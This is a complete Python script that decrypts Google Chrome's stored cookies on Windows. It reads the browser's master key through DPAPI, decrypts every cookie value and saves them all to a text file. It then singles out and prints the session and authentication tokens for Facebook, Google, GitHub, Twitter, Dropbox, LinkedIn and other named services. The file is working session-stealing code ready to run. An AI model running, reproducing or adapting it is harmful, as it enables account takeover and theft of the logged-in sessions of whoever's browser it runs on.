import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt  # pip install pypiwin32
from Crypto.Cipher import AES  # pip install pycryptodome
from colorama import Fore, Style

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime."""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    return ""

def get_encryption_key():
    """Retrieve and decrypt the Chrome encryption key."""
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    """Decrypt Chrome cookies data."""
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def write_output(file_path, content):
    """Write content to a file."""
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(content)

def main():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    
    key = get_encryption_key()
    unfiltered_output = ""
    filtered_output = ""
    specific_cookies = {
        'facebook': ['xs', 'c_user'],
        'instagram': ['sessionid'],
        'google': ['GAPS', 'SID', 'SSID'],
        'twitter': ['auth_token', 'twid'],
        'amazon': ['session-id', 'session-id-time'],
        'reddit': ['session', 'reddit_session'],
        'linkedin': ['li_at', 'JSESSIONID'],
        'yahoo': ['B', 'Y'],
        'github': ['user_session', 'logged_in'],
        'ebay': ['EBAY_SSO', 'nckc'],
        'dropbox': ['auth_token', 'session_id'],
        'spotify': ['sp_t', 'sp_key']
    }
    
    found_cookies = {site: {} for site in specific_cookies}

    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value

        output = f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================
        """
        
        unfiltered_output += output
        
        for site, cookies in specific_cookies.items():
            if site in host_key:
                filtered_output += output
                if name in cookies:
                    found_cookies[site][name] = decrypted_value

    write_output('unfiltered_cookies.txt', unfiltered_output)
    
    # Print all cookies
    print(filtered_output)

    # Print specific cookies if found
    for site, cookies in found_cookies.items():
        if cookies:
            print(f'\n{Fore.LIGHTGREEN_EX}{site.capitalize()} Cookies Found:{Fore.RESET}')
            for name, value in cookies.items():
                print(Fore.LIGHTBLUE_EX + str(name) + ': ' + Fore.YELLOW + str(value) + Fore.RESET)

    cursor.close()
    db.close()

if __name__ == "__main__":
    main()